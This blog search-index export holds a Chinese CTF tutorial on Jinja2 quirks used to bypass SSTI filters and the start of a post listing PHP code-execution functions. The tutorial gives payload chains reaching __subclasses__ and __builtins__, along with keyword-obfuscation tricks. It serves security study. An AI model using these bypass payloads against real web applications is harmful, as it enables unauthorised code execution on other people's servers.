<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于jinja2特性对ssti的bypass的影响</title>
      <link href="/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/"/>
      <url>/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/</url>
      
        <content type="html"><![CDATA[<p>之前写了一篇关于<a href="https://lexsd6.github.io/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">python ssti</a>的文章,但在分析时过于肤浅地将重心放在python与flask上,从而完全忽视了对jinja2的深入探讨。实际上我们在flask中用<code>{ {</code>与<code>{ %</code>在进行执行python逃逸时并不是直接给python引擎处理,而是要先经过jinja2’渲染’一道.<a id="more"></a></p><p><img src="%5Cimage-20201127153310543.png" alt="image-20201127153310543"></p><h1 id="jinja2特性"><a href="#jinja2特性" class="headerlink" title="jinja2特性"></a>jinja2特性</h1><h2 id="变量属性"><a href="#变量属性" class="headerlink" title="变量属性"></a>变量属性</h2><p>在python中,我们常常是通过<code>.</code>来获取变量的属性的.例如<code>().__class__</code>.</p><p>但jinja2给我们提供了另外两种思路：<code>[]</code>与<code>|attr</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[]用法</span></span><br><span class="line">()[<span class="string">'__class__'</span>]</span><br><span class="line"><span class="comment">#|attr用法</span></span><br><span class="line">()|attr(<span class="string">'__class__'</span>)</span><br></pre></td></tr></table></figure><p>这里要值得注意的是纯python中<code>.</code>只有取对象属性的意思。但在jinja2下：`</p><p><code>xx.__class__</code>会先检测<code>x</code>对象有没有名为<code>__class__</code>的属性，若没会<strong>继续</strong>检测<code>xx</code>对象有没有名为<code>__class__</code>的这一项元素。如果没有，返回一个未定义对象。</p><p>但<code>xx[&#39;__class__&#39;]</code>确是：</p><p><code>xx[&#39;__class__&#39;]</code>会先检测<code>x</code>对象有没有名为<code>__class__</code>的这一项元素，若没会<strong>继续</strong>检测<code>xx</code>对象有没有名为<code>__class__</code>的这属性。如果没有，返回一个未定义对象。</p><p>而<code>xx|attr(&#39;__class__&#39;)</code>这个它只查找属性，如果没有返回一个未定义对象。</p><p>来举个栗子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#纯python交换行下</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">'pop'</span>:<span class="number">1</span>&#125;.pop</span><br><span class="line">&lt;built-<span class="keyword">in</span> method pop of dict object at <span class="number">0x000001A352BF8778</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;<span class="string">'po'</span>:<span class="string">'1'</span>&#125;.po</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">'dict'</span> object has no attribute <span class="string">'po'</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#jinja2 中,xx.__class__ 式:</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;  &#123;<span class="string">'pop'</span>:<span class="string">'1'</span>&#125;.pop   &#125;&#125;</span><br><span class="line">&lt;built-<span class="keyword">in</span> method pop of dict object at <span class="number">0x7fbec74f0050</span>&gt;</span><br><span class="line"></span><br><span class="line">&#123;&#123;  &#123;<span class="string">'po'</span>:<span class="string">'1'</span>&#125;.po  &#125;&#125;</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="comment">#jinja2 中,xx['__class__'] 式:</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;<span class="string">'pop'</span>:<span class="string">'1'</span>&#125;[<span class="string">'pop'</span>]&#125;&#125;</span><br><span class="line"><span class="number">1</span> </span><br><span class="line">&#123;&#123;&#123;<span class="string">'po'</span>:<span class="string">'1'</span>&#125;[<span class="string">'po'</span>]&#125;&#125;</span><br><span class="line"><span class="number">1</span> </span><br><span class="line"></span><br><span class="line">&#123;&#123;  &#123;<span class="string">'pop'</span>:<span class="string">'1'</span>&#125;|attr(<span class="string">'pop'</span>)  &#125;&#125;</span><br><span class="line">     <span class="comment">#(一个未定义对象)</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> method pop of dict object at <span class="number">0x7fbec74edd70</span>&gt; </span><br><span class="line">&#123;&#123;  &#123;<span class="string">'po'</span>:<span class="string">'1'</span>&#125;|attr(<span class="string">'po'</span>)  &#125;&#125;</span><br><span class="line">     <span class="comment">#(一个未定义对象)</span></span><br></pre></td></tr></table></figure><h2 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h2><p>在jinji的渲染中，变量不能随意地被赋值。</p><p>变量赋值只能通过<code>{ % set x=xxx % }</code>来进行赋值，在<code>{ { } }</code>中只能使用变量而不能定义赋值变量。</p><h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2><p>在纯python中我们习惯用<code>+</code>来拼接字符串。</p><p>但在jinja2中我们还可以用<code>~</code>来拼接字符串。是<code>~</code>会把所有的操作数转换为字符串，并且连接它们。因此要注意的是：</p><p>1。操作数本来就是字符串，<code>~</code>会像<code>+</code>一样拼接它们。 </p><p><code>{ { &quot;Hello&quot; ~ &quot;name&quot; ~ &quot;!&quot; } }</code> 会返回： <code>Helloname!</code></p><p>2。若操作数是一个定义了且有值的变量名,<code>~</code>会用它的值来和其他字符串一起拼接。</p><p><code>Helloundefined!</code> 会返回（假设 name 值为 ‘lexsd6’ ）： <code>Hellolexsd6!</code></p><p>3。若操作数是一个定义了且为赋值或未定义的变量名,<code>~</code>会跳过ta用剩下的操作数来一起拼接。</p><p><code>{ { &quot;Hello&quot; ~ name ~ &quot;!&quot; } }</code> 会返回（假设 name  未定义 ）： <code>Hello!</code></p><p>4。若操作数是一个数字 or 元组 or 字典 or 列表 等常数 将直接转化为字符串来和其他操作数拼接。</p><p><code>{ { &quot;Hello&quot; ~ 1 ~ &quot;!&quot; } }</code> 会返回： <code>Hello1!</code></p><p><code>{ { &quot;Hello&quot; ~ (1,2) ~ &quot;!&quot; } }</code> 会返回： <code>Hello(1,2)!</code></p><p><code>{ { &quot;Hello&quot; ~ {1:2} ~ &quot;!&quot; } }</code> 会返回： <code>Hello{1,2}!</code></p><p><code>{ { &quot;Hello&quot; ~ [1,2] ~ &quot;!&quot; } }</code> 会返回： <code>Hello[1,2]!</code></p><h2 id="字符串转码"><a href="#字符串转码" class="headerlink" title="字符串转码"></a>字符串转码</h2><p>字符转码是一个web模板常有的东西。但通常都是url编码的转化。</p><p>但在jinja2中，还可以自动将16进制，8进制，unicode编码的字符串转码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># \xXX</span></span><br><span class="line"><span class="string">'\x5F\x5F\x63\x6C\x61\x73\x73\x5F\x5F'</span> ==<span class="string">'__class__'</span></span><br><span class="line"><span class="comment">#\000</span></span><br><span class="line"><span class="string">'\137\137\143\154\141\163\163\137\137'</span>==<span class="string">'__class__'</span></span><br><span class="line"><span class="comment">#\uXXX</span></span><br><span class="line"><span class="string">'\u005F\u005F\u0063\u006C\u0061\u0073\u0073\u005F\u005F'</span>==<span class="string">'__class__'</span></span><br><span class="line"><span class="comment">#\uXXXXXXXX</span></span><br><span class="line"><span class="string">'\U0000005F\U0000005F\U00000063\U0000006C\U00000061\U00000073\U00000073\U0000005F\U0000005F'</span>==<span class="string">'__class__'</span></span><br></pre></td></tr></table></figure><h2 id="过滤器机制"><a href="#过滤器机制" class="headerlink" title="过滤器机制"></a>过滤器机制</h2><p>在jinji2中有一种独特的调用机制,这种机制本意是用来对<code>{ {</code>与<code>{ %</code>中的数据进行筛选或类型转化的. 过滤器通过<code>|</code>来调用它们.例如<code>|attr()</code>就是一个典型的过滤器.</p><h3 id="attr"><a href="#attr" class="headerlink" title="|attr"></a>|attr</h3><p>之前已经说过，这是对 ‘对象’ 取属性的 过滤器。这里再强调下<code>|attr</code><strong>只查找属性</strong>.</p><h3 id="float"><a href="#float" class="headerlink" title="|float"></a>|float</h3><p>若在<code>|</code>对对象是纯数字的字符串前将非浮点数型的数字字符则将其转化为浮点数.否则将括号类的字符转换为浮点型(若没有参数返回<code>0.0</code>).同时<code>|</code>符合要求时括号可以简写.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'1'</span>|float()  <span class="comment"># 1.0</span></span><br><span class="line"><span class="string">'1'</span>|float  <span class="comment"># 1.0</span></span><br><span class="line"><span class="number">1</span>|float()  <span class="comment"># 1.0</span></span><br><span class="line"><span class="number">1</span>|float  <span class="comment"># 1.0</span></span><br><span class="line">[<span class="number">1</span>]|float(<span class="number">1</span>) <span class="comment">#1.0</span></span><br><span class="line">[<span class="number">1</span>]|float() <span class="comment">#0.0</span></span><br><span class="line">[<span class="number">1</span>]|float <span class="comment">#0.0</span></span><br></pre></td></tr></table></figure><h3 id="format"><a href="#format" class="headerlink" title="|format"></a>|format</h3><p>纯python中format在jinja中同样可以但jinjia提供格外的<code>|format</code>方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">"%s - %s"</span>|format(<span class="string">"lexs"</span>, <span class="string">"d6!"</span>) &#125;&#125; <span class="comment">#lexs-d6!</span></span><br></pre></td></tr></table></figure><h3 id="join"><a href="#join" class="headerlink" title="|join"></a>|join</h3><p>返回一个字符串，该字符串是序列中字符串的串联。元素之间的分隔符默认为空字符串，可以使用可选参数定义字符串。(ps:如果对象是字典，则只拼接 <strong>键</strong> )</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">1</span>,<span class="string">'a'</span>,b]|join&#125;&#125; <span class="comment">#1a</span></span><br><span class="line">&#123;&#123;[<span class="number">1</span>,<span class="string">'a'</span>,b]|join(<span class="number">3</span>)&#125;&#125; <span class="comment">#13a3</span></span><br><span class="line">&#123;&#123;  &#123;<span class="string">'a'</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="number">2</span>&#125;|join&#125;&#125; <span class="comment">#ab</span></span><br></pre></td></tr></table></figure><h3 id="last"><a href="#last" class="headerlink" title="|last"></a>|last</h3><p>取一个字符串，元组，列表的最后一项。（高版本的字典不行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'1234'</span>|last()&#125;&#125;<span class="comment">#4</span></span><br><span class="line">&#123;&#123;(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)|last()&#125;&#125; <span class="comment">#4</span></span><br><span class="line">&#123;&#123;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]|last()&#125;&#125;<span class="comment">#4</span></span><br></pre></td></tr></table></figure><h3 id="list"><a href="#list" class="headerlink" title="|list"></a>|list</h3><p>将值转换为列表.如果是字符串，则返回的列表将是字符列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,%<span class="number">27</span>a%<span class="number">27</span>,b|list <span class="comment">#(1, 'a', [])</span></span><br><span class="line">&#123;&#123;<span class="string">'abc'</span>|list&#125;&#125; <span class="comment">#['a', 'b', 'c']</span></span><br></pre></td></tr></table></figure><h3 id="lower"><a href="#lower" class="headerlink" title="|lower"></a>|lower</h3><p>将大写字母转换为小写字母.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'ＣＬＡＳＳ'</span>|lower()&#125;&#125; <span class="comment">#ｃｌａｓｓ</span></span><br></pre></td></tr></table></figure><h3 id="string"><a href="#string" class="headerlink" title="|string"></a>|string</h3><p>如果对象不是字符串则转换为字符串.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>|string&#125;&#125; <span class="comment"># (1, 2, 3, '4')</span></span><br></pre></td></tr></table></figure><h3 id="replace"><a href="#replace" class="headerlink" title="|replace"></a>|replace</h3><p>对对象中出现的字符串进行替代。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'fl4g'</span>|replace(<span class="string">'4'</span>,<span class="string">'a'</span>)&#125;&#125; <span class="comment">#flag</span></span><br></pre></td></tr></table></figure><h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><p>在jinja的<code>{ {</code>与<code>{ %</code>中虽然环境中其实也有全局函数存在的。</p><p>如range，lipsum，dict，cycler，reset，next，current，joiner。</p><p>这些函数大多用法和纯python差不多，而且是以<strong>类</strong>来定义，在ssti中大多都是<code>xxx.__class__</code>工具人。但要提下<strong>dict</strong>。</p><h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>在jinja2中 {‘foo’ : ‘bar’} 与 dict(foo=bar) 等价。(凭空生字符串)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;dict(lexs=<span class="number">0</span>)&#125;&#125; <span class="comment">#  &#123;'lexs': 0&#125;</span></span><br></pre></td></tr></table></figure><h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h3 id="参数关键词字符过滤"><a href="#参数关键词字符过滤" class="headerlink" title="参数关键词字符过滤"></a>参数关键词字符过滤</h3><h4 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h4><p>利用<code>+</code>与<code>~</code>来进行字符串拼接操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'__clas'</span>+<span class="string">'s__'</span></span><br><span class="line"><span class="string">'__clas'</span>~<span class="string">'s__'</span></span><br></pre></td></tr></table></figure><h4 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h4><p>用|replace来替换关键字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'fl4g'</span>|replace(<span class="string">'4'</span>,<span class="string">'a'</span>)&#125;&#125; <span class="comment">#flag</span></span><br></pre></td></tr></table></figure><h4 id="进行decode解编码绕过"><a href="#进行decode解编码绕过" class="headerlink" title="进行decode解编码绕过"></a>进行decode解编码绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#base64 decode解编码</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'X19jbGFzc19f'</span>.decode(<span class="string">'base64'</span>)] <span class="comment">#''.__class__</span></span><br><span class="line"><span class="comment">#hex decode解编码</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'5f5f636c6173735f5f'</span>.decode(<span class="string">'hex'</span>)]<span class="comment">#''.__class__</span></span><br><span class="line"><span class="comment">#rot13 decode解编码</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'__pynff__'</span>.decode(<span class="string">'rot13'</span>)]<span class="comment">#''.__class__</span></span><br></pre></td></tr></table></figure><h4 id="利用-string转化字符拼接绕过"><a href="#利用-string转化字符拼接绕过" class="headerlink" title="利用|string转化字符拼接绕过"></a>利用|string转化字符拼接绕过</h4><p>利用<code>|string</code>会对象转为字符串的特性。将一些内置对象转为字符串来拼接绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(x|select|string)[<span class="number">24</span>]~(x|select|string)[<span class="number">24</span>]~(x|select|string)[<span class="number">15</span>]~(x|select|string)[<span class="number">20</span>]~(x|select|string)[<span class="number">6</span>]~(x|select|string)[<span class="number">18</span>]~(x|select|string)[<span class="number">18</span>]~(x|select|string)[<span class="number">24</span>]~(x|select|string)[<span class="number">24</span>]&#125;&#125;<span class="comment">#__class__</span></span><br></pre></td></tr></table></figure><h4 id="利用-join来提取"><a href="#利用-join来提取" class="headerlink" title="利用|join来提取"></a>利用|join来提取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;  [<span class="string">'f'</span>,<span class="string">'l'</span>,<span class="string">'a'</span>,<span class="string">'g'</span>]|join()    &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="利用request-args，request-values进行传参"><a href="#利用request-args，request-values进行传参" class="headerlink" title="利用request.args，request.values进行传参"></a>利用request.args，request.values进行传参</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;""[request.args.class][request.args.x1][request.args.x2][request.args.x3]()[40]&#125;&#125;?class=__class__&amp;x1=__base__&amp;x2=__base__&amp;x3=__subclasses__</span><br><span class="line"><span class="comment">#若’.’也被过滤可以用’[]’套娃方式代替</span></span><br><span class="line">&#123;&#123;""[request['args']['c']]&#125;&#125;?c=__class__</span><br></pre></td></tr></table></figure><h4 id="利用模板渲染编码绕过：（部分新版本）"><a href="#利用模板渲染编码绕过：（部分新版本）" class="headerlink" title="利用模板渲染编码绕过：（部分新版本）"></a>利用模板渲染编码绕过：（部分新版本）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#16进制（\xXX）绕过。</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'\x5F\x5F\x63\x6C\x61\x73\x73\x5F\x5F'</span>]  <span class="comment">#''.__class__</span></span><br><span class="line"><span class="comment">#8进制（\OOO）绕过。</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'\137\137\143\154\141\163\163\137\137'</span>]  <span class="comment">#''.__class__</span></span><br><span class="line"><span class="comment">#unicode（\uXXXXor\UXXXXXXXX）绕过。</span></span><br><span class="line"><span class="comment">#\uX<span class="doctag">XXX:</span></span></span><br><span class="line">    <span class="string">''</span>[<span class="string">'\137\137\143\154\141\163\163\137\137'</span>]  <span class="comment">#''.__class__</span></span><br><span class="line"><span class="comment">#\UXXXXX<span class="doctag">XXX:</span></span></span><br><span class="line">    <span class="string">''</span>[<span class="string">'\U0000005F\U0000005F\U00000063\U0000006C\U00000061\U00000073\U00000073\U0000005F\U0000005F'</span>]  <span class="comment">#''.__class__</span></span><br></pre></td></tr></table></figure><h3 id="引号被过滤"><a href="#引号被过滤" class="headerlink" title="引号被过滤"></a>引号被过滤</h3><h4 id="dict-与-jion配合"><a href="#dict-与-jion配合" class="headerlink" title="dict 与|jion配合"></a>dict 与|jion配合</h4><p>利用在jinja中dict会将键名转化字符串，再利用|jion作用时只拼接键值的特性绕过。（ps：注意键值唯一！）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(dict(c=<span class="number">1</span>,l=<span class="number">1</span>,a=<span class="number">1</span>,s=<span class="number">1</span>)|join)~(dict(s=<span class="number">1</span>)|join)&#125;&#125;<span class="comment">#class</span></span><br></pre></td></tr></table></figure><h4 id="dict-与-list-、-last配合"><a href="#dict-与-list-、-last配合" class="headerlink" title="dict 与|list 、|last配合"></a>dict 与|list 、|last配合</h4><p>利用dict 构照字典再list转列表提取key值再用last取之。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;dict(a=<span class="number">1</span>)|list|last&#125;&#125; <span class="comment">#a</span></span><br></pre></td></tr></table></figure><h4 id="jion与字符串切片提取键值"><a href="#jion与字符串切片提取键值" class="headerlink" title="|jion与字符串切片提取键值"></a>|jion与字符串切片提取键值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">91</span>].__init__.__globals__|join)[<span class="number">62</span>:<span class="number">74</span>] <span class="comment">## #|jion 提取 __builtins__</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;(<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">91</span>].__init__.__globals__)[(<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">91</span>].__init__.__globals__|join)[<span class="number">62</span>:<span class="number">74</span>]]&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="list提取字典键值"><a href="#list提取字典键值" class="headerlink" title="|list提取字典键值"></a>|list提取字典键值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># |list 的作用是字典时会只将字典键值作为转为字符串列表</span></span><br><span class="line"><span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">91</span>].__init__.__globals__|list)[<span class="number">7</span>] </span><br><span class="line"><span class="comment"># __builtins__</span></span><br><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">91</span>].__init__.__globals__[(<span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">91</span>].__init__.__globals__|list)[<span class="number">7</span>]]&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="string-转化出字符拼接"><a href="#string-转化出字符拼接" class="headerlink" title="string 转化出字符拼接"></a>string 转化出字符拼接</h4><p>|string将非字符转化为字符的功能很强大,也可以用转化对象来拼字符.</p><h3 id="被过滤"><a href="#被过滤" class="headerlink" title="[]被过滤"></a><code>[]</code>被过滤</h3><h4 id="取属性"><a href="#取属性" class="headerlink" title="取属性"></a>取属性</h4><p>用|attr或 <code>.</code>来代替。</p><h4 id="对字典操作"><a href="#对字典操作" class="headerlink" title="对字典操作"></a>对字典操作</h4><p>pop函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;<span class="string">'a'</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="number">2</span>&#125;.pop(<span class="string">'b'</span>)&#125;&#125; <span class="comment">#2</span></span><br></pre></td></tr></table></figure><p><code>__getitem__</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#123;&#39;a&#39;:1,&#39;b&#39;:2&#125;.__getitem__(&#39;b&#39;)&#125;&#125; #2</span><br></pre></td></tr></table></figure><h4 id="对列表操作"><a href="#对列表操作" class="headerlink" title="对列表操作"></a>对列表操作</h4><p>pop函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].pop(<span class="number">1</span>)&#125;&#125; <span class="comment">#2</span></span><br></pre></td></tr></table></figure><p><code>__getitem__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].__getitem__(<span class="number">1</span>)&#125;&#125;<span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>last</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]|last()&#125;&#125;<span class="comment">#3</span></span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://docs.jinkan.org/docs/jinja2/templates.html" target="_blank" rel="noopener">http://docs.jinkan.org/docs/jinja2/templates.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php执行与文件系统处理函数整理</title>
      <link href="/2020/11/16/%E5%85%B3%E4%BA%8Ephp%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/"/>
      <url>/2020/11/16/%E5%85%B3%E4%BA%8Ephp%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>最近难得有空将php中执行与文件系统处理相关常见的函数给总结一下吧。(顺便加强下记忆)</p><a id="more"></a><h2 id="php代码执行函数"><a href="#php代码执行函数" class="headerlink" title="php代码执行函数"></a>php代码执行函数</h2><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>把字符串作为PHP代码执行(因为是一个语言构造器而不是一个函数，不能被可变函数调用。)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php <span class="keyword">eval</span>(<span class="string">'code'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><p>把字符串作为PHP代码执行,在php7是一个可变函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php assert(<span class="string">'code'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h4><p>preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使 preg_replace() 将 replacement 参数当作 PHP 代码。（PHP 5.5.0 起， 传入 “\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\e” 也无法起效。）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">    preg_replace(<span class="string">"/abc/e"</span>,<span class="string">'code'</span>,<span class="string">"php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><p>create_function —创建一个匿名（lambda样式）函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$func =create_function(<span class="string">''</span>,<span class="string">'code'</span>);</span><br><span class="line">$func();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h4><p>call_user_func — 把第一个参数作为回调函数调用，第二个作为传入被回掉函数的参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">call_user_func (<span class="string">'func'</span>,<span class="string">'arge'</span>);</span><br><span class="line"><span 